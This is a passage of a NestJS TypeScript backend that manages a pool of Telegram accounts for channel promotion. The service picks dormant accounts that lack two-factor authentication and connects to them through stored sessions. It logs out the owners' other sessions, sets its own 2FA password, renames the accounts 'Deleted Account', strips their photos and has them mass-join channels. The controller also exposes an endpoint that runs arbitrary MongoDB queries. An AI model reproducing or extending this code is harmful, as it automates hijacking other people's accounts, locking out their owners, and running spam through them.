  type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\n\nexport class SearchPromoteClientDto {\n  @ApiPropertyOptional({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsOptional()\n  @IsString()\n  readonly tgId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsOptional()\n  @IsString()\n  readonly mobile?: string;\n\n  @ApiPropertyOptional({\n    description: 'availableDate of the promoteClient',\n    example: '2023-06-22',\n  })\n  @IsOptional()\n  @IsString()\n  readonly availableDate?: string;\n\n  @ApiPropertyOptional({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels?: number;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreatePromoteClientDto } from './create-promote-client.dto';\n\nexport class UpdatePromoteClientDto extends PartialType(CreatePromoteClientDto) {}\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiQuery } from '@nestjs/swagger';\nimport { PromoteClientService } from './promote-client.service';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport { SearchPromoteClientDto } from './dto/search-promote-client.dto';\nimport { PromoteClient } from './schemas/promote-client.schema';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\n\n@ApiTags('Promote Clients')\n@Controller('promoteclients')\nexport class PromoteClientController {\n  constructor(private readonly clientService: PromoteClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createClientDto: CreatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  @ApiQuery({ name: 'mobile', required: false, description: 'Mobile number' })\n  @ApiQuery({ name: 'firstName', required: false, description: 'First name' })\n  @ApiQuery({ name: 'lastName', required: false, description: 'Last name' })\n  @ApiQuery({ name: 'username', required: false, description: 'Username' })\n  async search(@Query() query: SearchPromoteClientDto): Promise<PromoteClient[]> {\n    return this.clientService.search(query);\n  }\n\n  @Get('joinChannelsForPromoteClients')\n  @ApiOperation({ summary: 'Join Channels for PromoteClients' })\n  async joinChannelsforPromoteClients(): Promise<string> {\n    return this.clientService.joinchannelForPromoteClients();\n  }\n\n  @Get('checkPromoteClients')\n  @ApiOperation({ summary: 'Check Promote Clients' })\n  async checkpromoteClients(): Promise<string> {\n    this.clientService.checkPromoteClients();\n    return \"initiated Checking\"\n  }\n\n  @Post('addNewUserstoPromoteClients')\n  @ApiOperation({ summary: 'Add New Users to Promote Clients' })\n  @ApiBody({ type: Object })\n  async addNewUserstoPromoteClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\n    this.clientService.addNewUserstoPromoteClients(body.badIds, body.goodIds);\n    return \"initiated Checking\"\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<PromoteClient[]> {\n    return this.clientService.findAll();\n  }\n\n  @Get('SetAsPromoteClient/:mobile')\n  @ApiOperation({ summary: 'Set as Promote Client' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  async setAsPromoteClient(\n    @Param('mobile') mobile: string,\n  ) {\n    return await this.clientService.setAsPromoteClient(mobile);\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('mobile') mobile: string): Promise<PromoteClient> {\n    return this.clientService.findOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.update(mobile, updateClientDto);\n  }\n\n  @Put(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('mobile') mobile: string): Promise<void> {\n    return this.clientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiBody({ type: Object })\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.clientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteClientService } from './promote-client.service';\nimport { PromoteClientController } from './promote-client.controller';\nimport { PromoteClientSchema } from './schemas/promote-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { UsersModule } from '../users/users.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'promoteClientModule', schema: PromoteClientSchema, collection: 'promoteClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ActiveChannelsModule),\n    forwardRef(() => ClientModule),\n    forwardRef(() => ChannelsModule),\n    forwardRef(() => BufferClientModule),\n ],\n  controllers: [PromoteClientController],\n  providers: [PromoteClientService],\n  exports: [PromoteClientService]\n})\nexport class PromoteClientModule { }\n","import { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, Logger, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport { PromoteClient, PromoteClientDocument } from './schemas/promote-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { ClientService } from '../clients/client.service';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager'\n@Injectable()\nexport class PromoteClientService {\n    private readonly logger = new Logger(PromoteClientService.name);\n    private joinChannelMap: Map<string, Channel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout;\n    private leaveChannelMap: Map<string, string[]> = new Map();\n    private leaveChannelIntervalId: NodeJS.Timeout;\n    private isLeaveChannelProcessing: boolean = false;\n    private isJoinChannelProcessing: boolean = false;\n    private readonly JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000; // 4 minutes\n    constructor(@InjectModel('promoteClientModule') private promoteClientModel: Model<PromoteClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n    ) {}\n\n    async create(promoteClient: CreatePromoteClientDto): Promise<PromoteClient> {\n        const newUser = new this.promoteClientModel(promoteClient);\n        return newUser.save();\n    }\n\n    async findAll(): Promise<PromoteClient[]> {\n        return this.promoteClientModel.find().exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<PromoteClient> {\n        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n\n    async update(mobile: string, updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n        const updatedUser = await this.promoteClientModel.findOneAndUpdate(\n            { mobile },\n            { $set: updateClientDto },\n            { new: true, upsert: true, returnDocument: 'after' }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreatePromoteClientDto | UpdatePromoteClientDto): Promise<PromoteClient> {\n        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            console.log(\"Updating\")\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdatePromoteClientDto);\n        } else {\n            console.log(\"creating\")\n            return this.create(createOrUpdateUserDto as CreatePromoteClientDto);\n        }\n    }\n\n    async remove(mobile: string): Promise<void> {\n        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);\n        const result = await this.promoteClientModel.deleteOne({ mobile }).exec();\n        if (result.deletedCount === 0) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n    }\n    async search(filter: any): Promise<PromoteClient[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.promoteClientModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<PromoteClient[]> {\n        try {\n\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.promoteClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    removeFromPromoteMap(key: string) {\n        this.joinChannelMap.delete(key)\n    }\n    clearPromoteMap() {\n        console.log(\"PromoteMap cleared\")\n        this.joinChannelMap.clear()\n    }\n\n    async joinchannelForPromoteClients(skipExisting: boolean = true): Promise<string> {\n        if (!this.telegramService.getActiveClientSetup()) {\n            this.logger.log('Starting join channel process');\n\n            // Clear both queues before starting new process\n            this.clearJoinChannelInterval();\n            this.clearLeaveChannelInterval();\n\n            try {\n                const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());\n                this.logger.debug(`Using existing keys: ${existingkeys.join(', ')}`);\n\n                await connectionManager.disconnectAll();\n                await sleep(2000);\n\n                const clients = await this.promoteClientModel.find({\n                    channels: { \"$lt\": 300 },\n                    mobile: { $nin: existingkeys }\n                }).sort({ channels: 1 }).limit(4);\n\n                this.logger.debug(`Found ${clients.length} clients to process`);\n\n                if (clients.length > 0) {\n                    for (const document of clients) {\n                        try {\n                            this.logger.debug(`Processing client: ${document.mobile}`);\n                            const client = await connectionManager.getClient(document.mobile, { autoDisconnect: false, handler: false });\n\n                            const channels = await client.channelInfo(true);\n                            this.logger.debug(`${document.mobile}: Found ${channels.ids.length} existing channels`);\n\n                            await this.update(document.mobile, { channels: channels.ids.length });\n\n                            if (channels.canSendFalseCount < 10) {\n                                if (channels.ids.length < 220) {\n                                    this.logger.debug(`${document.mobile}: Getting channels from channels service`);\n                                    const result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\n                                    this.joinChannelMap.set(document.mobile, result);\n                                    this.joinChannelQueue();\n                                } else {\n                                    this.logger.debug(`${document.mobile}: Getting channels from active channels service`);\n                                    const result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\n                                    this.joinChannelMap.set(document.mobile, result);\n                                    this.joinChannelQueue();\n                                }\n                            } else {\n                                this.logger.debug(`${document.mobile}: Too many channels with no send permissions, queueing for leave: ${channels.canSendFalseChats.length}`);\n                                this.leaveChannelMap.set(document.mobile, channels.canSendFalseChats);\n                                this.leaveChannelQueue();\n                            }\n                        } catch (error) {\n                            const errorDetails = parseError(error);\n                            this.logger.error(`Error processing client ${document.mobile}:`, errorDetails);\n\n                            if (error.message === \"SESSION_REVOKED\" ||\n                                error.message === \"AUTH_KEY_UNREGISTERED\" ||\n                                error.message === \"USER_DEACTIVATED\" ||\n                                error.message === \"USER_DEACTIVATED_BAN\") {\n                                this.logger.warn(`${document.mobile}: Session invalid, removing client`);\n                                await this.remove(document.mobile);\n                            }\n                        } finally {\n                            connectionManager.unregisterClient(document.mobile);\n                        }\n                    }\n                }\n\n                this.logger.log(`Join channel process triggered successfully for ${clients.length} clients`);\n                return `Initiated Joining channels for ${clients.length}`;\n            } catch (error) {\n                this.logger.error('Error during joinchannelForPromoteClients:', error);\n                // Clean up on error\n                this.clearJoinChannelInterval();\n                this.clearLeaveChannelInterval();\n                throw new Error(\"Failed to initiate channel joining process\");\n            }\n        } else {\n            this.logger.warn('Ignored active check for promote channels as an active client setup exists');\n            return \"Active client setup exists, skipping promotion\";\n        }\n    }\n\n    async joinChannelQueue() {\n        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {\n            this.logger.warn('Join channel process is already running, instance:', this.joinChannelIntervalId);\n            return;\n        }\n\n        const existingKeys = Array.from(this.joinChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to join, skipping queue');\n            return;\n        }\n\n        this.isJoinChannelProcessing = true;\n        this.joinChannelIntervalId = setInterval(async () => {\n            try {\n                const keys = Array.from(this.joinChannelMap.keys());\n                if (keys.length === 0) {\n                    this.logger.log('Join channel map is empty, clearing interval');\n                    this.clearJoinChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                const processTimeout = setTimeout(() => {\n                    this.logger.error('Join channel interval processing timeout');\n                    this.clearJoinChannelInterval();\n                }, this.JOIN_CHANNEL_INTERVAL - 1000);\n\n                this.logger.debug(`Processing join channel interval at ${new Date().toISOString()}`);\n\n                for (const mobile of keys) {\n                    const channels = this.joinChannelMap.get(mobile);\n                    if (!channels || channels.length === 0) {\n                        this.logger.debug(`No more channels to join for ${mobile}, removing from map`);\n                        this.removeFromPromoteMap(mobile);\n                        continue;\n                    }\n\n                    const channel = channels.shift();\n                    // Only update map if there are remaining channels\n                    if (channels.length > 0) {\n                        this.logger.debug(`${mobile}: Pending channels to join: ${channels.length}`);\n                        this.joinChannelMap.set(mobile, channels);\n                    } else {\n                        this.removeFromPromoteMap(mobile);\n                    }\n\n                    try {\n                        await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n                        this.logger.debug(`${mobile}: Attempting to join channel: @${channel.username}`);\n                        await this.telegramService.tryJoiningChannel(mobile, channel);\n                    } catch (error) {\n                        const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `, false);\n                        this.logger.error(`${mobile}: Error joining @${channel.username}:`, errorDetails);\n\n                        if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {\n                            this.logger.warn(`${mobile}: FloodWaitError or too many channels, handling...`);\n                            this.removeFromPromoteMap(mobile);\n                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);\n                            await this.update(mobile, { channels: channelsInfo.ids.length });\n                        }\n                        if (error.errorMessage === \"SESSION_REVOKED\" ||\n                            error.errorMessage === \"AUTH_KEY_UNREGISTERED\" ||\n                            error.errorMessage === \"USER_DEACTIVATED\" ||\n                            error.errorMessage === \"USER_DEACTIVATED_BAN\") {\n                            this.logger.error(`Session invalid for ${mobile}, removing client`);\n                            await this.remove(mobile);\n                        }\n                    } finally {\n                        await connectionManager.unregisterClient(mobile);\n                    }\n                }\n\n                clearTimeout(processTimeout);\n            } catch (error) {\n                this.logger.error('Error in join channel interval:', error);\n                this.clearJoinChannelInterval();\n            }\n        }, this.JOIN_CHANNEL_INTERVAL);\n\n        this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`);\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            this.logger.debug('Clearing join channel interval');\n            clearInterval(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n            this.isJoinChannelProcessing = false;\n\n            // Only schedule next run if there are items in the map\n            if (this.joinChannelMap.size > 0) {\n                setTimeout(() => {\n                    this.logger.debug('Triggering join channel process after timeout');\n                    this.joinchannelForPromoteClients(false);\n                }, 30000);\n            }\n        }\n    }\n\n    removeFromLeaveMap(key: string) {\n        this.logger.debug(`Removing mobile ${key} from leave map`);\n        this.leaveChannelMap.delete(key);\n        if (this.leaveChannelMap.size === 0) {\n            this.logger.log('Leave map is now empty');\n            this.clearLeaveChannelInterval();\n        }\n    }\n\n    clearLeaveMap() {\n        this.logger.debug('Clearing entire leave map');\n        this.leaveChannelMap.clear();\n        this.clearLeaveChannelInterval();\n    }\n\n    async leaveChannelQueue() {\n        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {\n            this.logger.warn('Leave channel process is already running, instance:', this.leaveChannelIntervalId);\n            return;\n        }\n\n        const existingKeys = Array.from(this.leaveChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to leave, not starting queue');\n            return;\n        }\n\n        this.isLeaveChannelProcessing = true;\n        this.leaveChannelIntervalId = setInterval(async () => {\n            try {\n                const keys = Array.from(this.leaveChannelMap.keys());\n                if (keys.length === 0) {\n                    this.logger.debug('Leave map is empty, clearing interval');\n                    this.clearLeaveChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                const processTimeout = setTimeout(() => {\n                    this.logger.error('Leave channel interval processing timeout');\n                    this.clearLeaveChannelInterval();\n                }, 60000 - 1000);\n\n                this.logger.debug(`Processing leave channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.leaveChannelIntervalId}`);\n\n                for (const mobile of keys) {\n                    this.logger.debug(`Processing leave channels for mobile: ${mobile}`);\n                    const channels = this.leaveChannelMap.get(mobile);\n                    if (!channels || channels.length === 0) {\n                        this.logger.debug(`No channels to leave for mobile: ${mobile}`);\n                        this.removeFromLeaveMap(mobile);\n                        continue;\n                    }\n\n                    const channelsToProcess = channels.splice(0, 10);\n\n                    // Only update map if there are remaining channels\n                    if (channels.length > 0) {\n                        this.logger.debug(`${mobile}: Processing ${channelsToProcess.length} channels, ${channels.length} remaining`);\n                        this.leaveChannelMap.set(mobile, channels);\n                    } else {\n                        this.removeFromLeaveMap(mobile);\n                    }\n\n                    try {\n                        const client = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n                        this.logger.debug(`${mobile}: Attempting to leave ${channelsToProcess.length} channels`);\n                        await client.leaveChannels(channelsToProcess);\n                        this.logger.debug(`${mobile}: Successfully left ${channelsToProcess.length} channels`);\n                    } catch (error) {\n                        const errorDetails = parseError(error);\n                        this.logger.error(`Error in leave channel process for ${mobile}:`, errorDetails);\n                        if (\n                            errorDetails.message === \"SESSION_REVOKED\" ||\n                            errorDetails.message === \"AUTH_KEY_UNREGISTERED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED_BAN\"\n                        ) {\n                            this.logger.warn(`${mobile}: Session invalid, removing client`);\n                            await this.remove(mobile);\n                            this.removeFromLeaveMap(mobile);\n                        }\n                    } finally {\n                        await connectionManager.unregisterClient(mobile);\n                    }\n                }\n\n                clearTimeout(processTimeout);\n            } catch (error) {\n                this.logger.error('Error in leave channel interval:', error);\n                this.clearLeaveChannelInterval();\n            }\n        }, 60000);\n\n        this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`);\n    }\n\n    clearLeaveChannelInterval() {\n        if (this.leaveChannelIntervalId) {\n            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);\n            clearInterval(this.leaveChannelIntervalId);\n            this.leaveChannelIntervalId = null;\n        }\n        this.isLeaveChannelProcessing = false;\n        this.logger.debug('Leave channel interval cleared and processing flag reset');\n    }\n\n    async setAsPromoteClient(\n        mobile: string,\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n    ) {\n        const user = (await this.usersService.search({ mobile, expired: false }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false)\n        if (isExist) {\n            throw new ConflictException('PromoteClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map(client => client?.mobile);\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\n        if (!clientMobiles.includes(mobile) && !clientPromoteMobiles.includes(mobile)) {\n            const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false });\n            try {\n                await telegramClient.set2fa();\n                await sleep(15000)\n                await telegramClient.updateUsername('');\n                await sleep(3000)\n                await telegramClient.updatePrivacyforDeletedAccount();\n                await sleep(3000)\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                await sleep(3000)\n                await telegramClient.deleteProfilePhotos();\n                const channels = await this.telegramService.getChannelInfo(mobile, true)\n                const promoteClient = {\n                    tgId: user.tgId,\n                    lastActive: \"default\",\n                    mobile: user.mobile,\n                    availableDate,\n                    channels: channels.ids.length,\n                }\n                await this.promoteClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: promoteClient }, { new: true, upsert: true }).exec();\n            } catch (error) {\n                const errorDetails = parseError(error)\n                throw new HttpException(errorDetails.message, errorDetails.status)\n            }\n            await connectionManager.unregisterClient(mobile)\n            return \"Client set as promote successfully\";\n        } else {\n            throw new BadRequestException(\"Number is a Active Client\")\n        }\n    }\n\n    async checkPromoteClients() {\n        if (!this.telegramService.getActiveClientSetup()) {\n            await connectionManager.disconnectAll()\n            await sleep(2000);\n            const promoteclients = await this.findAll();\n            let goodIds: string[] = [];\n            const badIds: string[] = [];\n            if (promoteclients.length < 80) {\n                for (let i = 0; i < 80 - promoteclients.length && badIds.length < 4; i++) {\n                    badIds.push(i.toString())\n                }\n            }\n            const clients = await this.clientService.findAll();\n            const bufferClients = await this.bufferClientService.findAll();\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\n            const bufferClientIds = bufferClients.map(client => client.mobile);\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            for (const document of promoteclients) {\n                if (!clientIds.includes(document.mobile) && !bufferClientIds.includes(document.mobile)) {\n                    try {\n                        const cli = await connectionManager.getClient(document.mobile, { autoDisconnect: false, handler: true });\n                        const me = await cli.getMe();\n                        if (me.username) {\n                            await this.telegramService.updateUsername(document.mobile, '');\n                            await sleep(2000);\n                        }\n                        if (me.firstName !== \"Deleted Account\") {\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                            await sleep(2000);\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\n                        }\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\n                        const hasPassword = await cli.hasPassword();\n                        if (!hasPassword && badIds.length < 4) {\n                            console.log(\"Client does not have password\");\n                            badIds.push(document.mobile);\n                            // await this.remove(document.mobile);\n                        } else {\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\n                            // await this.promoteClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\n                            console.log(document.mobile, \" :  ALL Good\");\n                            goodIds.push(document.mobile)\n                        }\n                        await this.telegramService.removeOtherAuths(document.mobile);\n                        await sleep(2000);\n                    } catch (error) {\n                        parseError(error);\n                        badIds.push(document.mobile);\n                        this.remove(document.mobile);\n                    } finally {\n                        await connectionManager.unregisterClient(document.mobile)\n                    }\n                } else {\n                    console.log(\"Number is a Active Client\");\n                    goodIds.push(document.mobile)\n                    this.remove(document.mobile)\n                }\n            }\n            goodIds = [...goodIds, ...clientIds, ...bufferClientIds]\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\n            this.addNewUserstoPromoteClients(badIds, goodIds);\n        } else {\n            console.log(\"ignored active check promote channels as active client setup exists\")\n        }\n    }\n\n    async addNewUserstoPromoteClients(badIds: string[], goodIds: string[]) {\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, twoFA: false, expired: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\n        console.log(\"New promote documents to be added: \", documents.length)\n        while (badIds.length > 0 && documents.length > 0) {\n            const document = documents.shift();\n            try {\n                try {\n                    const client = await connectionManager.getClient(document.mobile, { autoDisconnect: false });\n                    const hasPassword = await client.hasPassword();\n                    console.log(\"hasPassword: \", hasPassword);\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await client.set2fa();\n                        console.log(\"waiting for setting 2FA\");\n                        await sleep(30000);\n                        await client.updateUsername('');\n                        await sleep(3000)\n                        await client.updatePrivacyforDeletedAccount();\n                        await sleep(3000)\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                        await sleep(3000)\n                        await client.deleteProfilePhotos();\n                        const channels = await client.channelInfo(true)\n                        console.log(\"Inserting Document\");\n                        const promoteClient = {\n                            tgId: document.tgId,\n                            lastActive: \"today\",\n                            mobile: document.mobile,\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\n                            channels: channels.ids.length,\n                        }\n                        await this.create(promoteClient);\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        console.log(\"=============Created PromoteClient=============\")\n                        await connectionManager.unregisterClient(document.mobile)\n                        badIds.pop();\n                    } else {\n                        console.log(\"Failed to Update as PromoteClient has Password\");\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        await connectionManager.unregisterClient(document.mobile)\n                    }\n                } catch (error) {\n                    parseError(error)\n                    await connectionManager.unregisterClient(document.mobile)\n                }\n            } catch (error) {\n                parseError(error)\n                console.error(\"An error occurred:\", error);\n            }\n            await connectionManager.unregisterClient(document.mobile)\n        }\n        setTimeout(() => {\n            this.joinchannelForPromoteClients()\n        }, 2 * 60 * 1000);\n    }\n}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type PromoteClientDocument = PromoteClient & Document;\n@Schema({ collection: 'promoteClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class PromoteClient {\n  @Prop({ required: true})\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n  \n  @Prop({ required: true })\n  lastActive: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n}\n\nexport const PromoteClientSchema = SchemaFactory.createForClass(PromoteClient);\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { PromoteMsgsService } from './promote-msgs.service';\n\n@ApiTags('Promote-msgs')\n@Controller('promote-msgs')\nexport class PromoteMsgsController {\n  constructor(private readonly promoteMsgsService: PromoteMsgsService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get promote-msgs data' })\n  async findOne(): Promise<any>{\n    return this.promoteMsgsService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update promote-msgs' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.promoteMsgsService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteMsgsService } from './promote-msgs.service';\nimport { PromoteMsgsController } from './promote-msgs.controller';\nimport { PromoteMsgSchema } from './promote-msgs.schema';\n\n@Global()\n@Module({\n  imports: [\n    PromoteMsgModule,\n    MongooseModule.forFeature([{ name: 'promotemsgModule', collection: 'promoteMsgs', schema: PromoteMsgSchema }]),\n  ],\n  providers: [PromoteMsgsService],\n  controllers: [PromoteMsgsController],\n  exports: [PromoteMsgsService],\n})\nexport class PromoteMsgModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type PromoteMsgDocument = PromoteMsg & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class PromoteMsg {}\n\nexport const PromoteMsgSchema = SchemaFactory.createForClass(PromoteMsg);\nPromoteMsgSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { PromoteMsg } from './promote-msgs.schema';\n\n@Injectable()\nexport class PromoteMsgsService {\n    constructor(@InjectModel('promotemsgModule') private promotemsgModel: Model<PromoteMsg>) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = (await this.promotemsgModel.findOne({}, { _id: 0 }).exec())?.toJSON();\n        if (!user) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete 